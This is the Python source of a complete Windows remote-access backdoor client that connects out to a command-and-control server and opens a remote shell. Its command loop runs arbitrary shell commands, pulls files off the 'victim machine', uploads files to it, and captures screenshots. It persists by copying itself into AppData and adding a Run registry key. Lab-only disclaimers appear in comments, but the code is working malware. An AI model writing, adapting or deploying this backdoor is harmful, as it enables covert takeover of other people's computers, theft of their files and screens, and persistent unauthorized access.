import json
import os
import shutil
import subprocess
import sys
import base64
import socket
import time
import mss
import pyautogui 

# Optional: Use only in lab/test environments for learning purposes.
# For educational use only. Do NOT deploy on real targets.

def reliable_send(data, conn):
    """
    Send JSON-encoded data over socket connection.
    """
    json_data = json.dumps(data)
    conn.sendall(json_data.encode())

def reliable_recv(conn):
    """
    Receive and decode JSON data over socket connection.
    """
    buffer = ""
    while True:
        try:
            buffer += conn.recv(1024).decode()
            return json.loads(buffer)
        except json.JSONDecodeError:
            continue

def persist():
    """
    Adds registry entry for basic persistence (lab use only).
    """
    try:
        location = os.path.join(os.environ["appdata"], "client.exe")
        if not os.path.exists(location):
            shutil.copy(sys.executable, location)
            subprocess.run([
                'reg', 'add', r'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                '/v', 'client', '/t', 'REG_SZ', '/d', location, '/f'
            ], shell=True)
    except Exception as e:
        print("[-] Persistence error:", e)

def remove_persistence():
    """
    Removes the persistence registry entry.
    """
    try:
        location = os.path.join(os.environ["appdata"], "client.exe")
        if os.path.exists(location):
            os.remove(location)
            subprocess.run([
                'reg', 'delete', r'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                '/v', 'client', '/f'
            ], shell=True)
    except Exception as e:
        print("[-] Remove persistence error:", e)

def download_file(command, conn):
    """
    Handles file download from victim machine.
    """
    try:
        file_name = command.split()[1]
        with open(file_name, "rb") as f:
            file_data = base64.b64encode(f.read()).decode()
        reliable_send(file_data, conn)
    except FileNotFoundError:
        reliable_send("[!!] File not found", conn)
    except Exception as e:
        reliable_send(f"[!!] Error: {e}", conn)

def upload_file(command, conn):
    """
    Handles file upload to the victim machine.
    """
    try:
        file_name = command.split("\\")[-1]
        file_data = reliable_recv(conn)
        with open(file_name, "wb") as f:
            f.write(base64.b64decode(file_data))
        reliable_send("[+] Upload complete", conn)
    except Exception as e:
        reliable_send(f"[!!] Upload error: {e}", conn)

def take_screenshot():
    """
    Takes a screenshot using mss (lab/test environments only).
    """
    with mss.mss() as sct:
        screenshot = sct.shot(output="screenshot.png")
        with open("screenshot.png", "rb") as f:
            screenshot_data = base64.b64encode(f.read()).decode()
        os.remove("screenshot.png")
    return screenshot_data

def execute_command(command, conn):
    """
    Executes a system command and returns output.
    """
    try:
        print(f"[*] Executing: {command}")
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr or "[*] Command executed."
        reliable_send(output, conn)
    except Exception as e:
        error_message = f"[-] Error executing command: {e}"
        print(error_message)
        reliable_send(error_message, conn)

def shell(conn):
    """
    Main command shell loop.
    """
    while True:
        try:
            command = reliable_recv(conn)
            if command == "q":
                break
            elif command == "persist_enable":
                persist()
            elif command == "persist_disable":
                remove_persistence()
            elif command == "screenshot":
                screenshot_data = take_screenshot()
                reliable_send(screenshot_data, conn)
            elif command.startswith("download "):
                download_file(command, conn)
            elif command.startswith("upload "):
                upload_file(command, conn)
            elif command.startswith("cd "):
                new_dir = command[3:].strip()
                if os.path.isdir(new_dir):
                    os.chdir(new_dir)
                    reliable_send(f"[+] Changed to {new_dir}", conn)
                else:
                    reliable_send(f"[-] Directory not found: {new_dir}", conn)
            else:
                execute_command(command, conn)
        except Exception as e:
            print(f"[-] Unexpected error: {e}")

def connection():
    """
    Establish connection with the command and control server.
    """
    server_host = "127.0.0.1"  # Replace with your server's IP in lab
    server_port = 3000

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server_host, server_port))
            shell(sock)
            sock.close()
            break
        except socket.error:
            time.sleep(5)
            continue

if __name__ == "__main__":
    connection()
